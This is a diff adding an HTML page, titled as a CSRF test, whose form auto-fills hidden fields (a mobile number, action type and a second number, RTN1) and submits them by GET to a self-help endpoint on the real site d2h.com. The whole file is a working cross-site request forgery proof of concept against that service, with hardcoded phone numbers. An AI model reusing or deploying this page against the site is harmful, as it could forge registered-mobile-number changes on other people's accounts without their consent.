@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test with Checkbox</title>
+</head>
+<body>
+    <h1>CSRF Testing Form with Checkbox</h1>
+    <form action="https://www.d2h.com/SelfHelp/RMNCheck" method="GET">
+        <input type="hidden" name="MobileNo" value="6369544342">
+        <input type="hidden" name="MobileType" value="A">
+        <input type="hidden" name="ActionType" value="I">
+        <input type="hidden" name="RTN1" value="8189882856">
+        
+        <!-- Checkbox Input -->
+        <label>
+            <input type="checkbox" name="check" checked> Check this box
+        </label>
+        
+        <button type="submit">Submit CSRF Test</button>
+    </form>
+</body>
+</html>
